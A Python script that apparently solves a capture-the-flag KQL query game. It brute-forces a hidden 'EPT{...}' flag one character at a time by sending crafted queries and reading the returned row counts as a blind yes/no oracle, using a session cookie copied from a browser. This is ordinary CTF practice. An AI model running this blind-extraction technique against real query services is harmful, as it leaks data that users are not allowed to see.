import requests

start_url = "https://kqlgame.ept.gg/start-game"
game_url = "https://kqlgame.ept.gg/game"

# taken from my browser's session token
cookie = {
    "session": "eyJsZXZlbCI6MSwic3RhcnRfdGltZSI6MTczMDc5NzgzNC40MTcwMjY4LCJ0YXJnZXRfcm93cyI6MzR9.ZynhCg.Ugw_G8KNPswmrna1fXIP52XtJ68"
}

s = requests.Session()

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789, .'?!@$<>*:+=-\\/}"

def check_next_char(string):
    # refresh our token occasionally to make sure that we don't get timeout errors
    s.get(start_url, cookies=cookie)
    
    for nextchar in charset:
        data = {
            "query": f"""
            Users
            | where * contains_cs "\x7D"
            | where * contains_cs "{string+nextchar}"
            """
            # The format string's highlighting got messed up whenever i just put the raw "}" character.
            # 7D is simply the hex value of "}"
        }
        response = s.post(game_url, cookies=cookie, data=data).text
        
        # first check to make sure that the query was valid/returned *something*
        # then check that it returned more than 0
        if "The row count for your query was" in response and \
        "The row count for your query was 0" not in response:
            
            print("Found next valid prefix:", string+nextchar)
            is_exact_match(string+nextchar)
            check_next_char(string+nextchar)


def is_exact_match(string):
    data = {
        "query": f"""
        Users
        | where * == "{string}"
        """
    }
    response = s.post(game_url, cookies=cookie, data=data).text
    if "The row count for your query was 0" not in response:
        print("Found valid string:", string)

if __name__ == "__main__":
    check_next_char("EPT{")
